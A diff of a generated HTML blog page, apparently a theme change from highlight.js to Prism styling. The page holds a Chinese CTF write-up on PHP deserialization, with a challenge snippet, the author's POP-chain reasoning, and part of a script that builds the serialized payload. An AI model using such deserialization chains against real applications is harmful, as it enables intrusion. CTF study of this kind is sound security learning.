@@ -29,7 +29,15 @@
     
     
       
-      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.1.2/styles/atom-one-dark-reasonable.min.css" />
+      
+        
+          
+          
+          
+        
+        <link  rel="stylesheet" href="https://cdn.staticfile.org/prism/1.22.0/themes/prism-funky.min.css" />
+      
+      
     
   
 
@@ -245,7 +253,7 @@
               </p>
             
             <div class="markdown-body">
-              <h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><div class="hljs"><pre><code><pre><code class="hljs php">	 <span class="hljs-meta">&lt;?php</span>
+              <h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><pre><code><pre><code class="hljs php">	 <span class="hljs-meta">&lt;?php</span>
 	error_reporting(<span class="hljs-number">0</span>);
 	highlight_file(<span class="hljs-keyword">__FILE__</span>);
 	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span></span>
@@ -345,14 +353,14 @@
 	&#125;
 	$a=<span class="hljs-keyword">new</span> A();
 	
-	<span class="hljs-meta">?&gt;</span></code></pre></div>
+	<span class="hljs-meta">?&gt;</span></code></pre>
 
 
 
 
 返回：  gg         </code></pre>
 <p>一开始被A类中的<code>$A3()</code>吸引，觉得应该用这个调C中的<code>__invoke</code>，卡了几天，似乎if进不去;应该用<code>__get</code>，通过B类中的<code>__destruct</code>触发invoke<br>pop：<code>B1-&gt;new A-&gt;A2[&quot;godmi&quot;]=new C()-&gt;invoke-&gt;tostring-&gt;FLAG()</code>       </p>
-<div class="hljs"><pre><code>```php
+<pre><code>```php
 class A
 &#123;
     public $A1;
@@ -426,7 +434,7 @@ $x=new B();
 echo serialize($x);
 
 ?&gt;
-```       </code></pre></div>
+```       </code></pre>
 
             </div>
             <hr>
@@ -571,6 +579,8 @@ echo serialize($x);
 
 
 
+  
+    
   
 
 
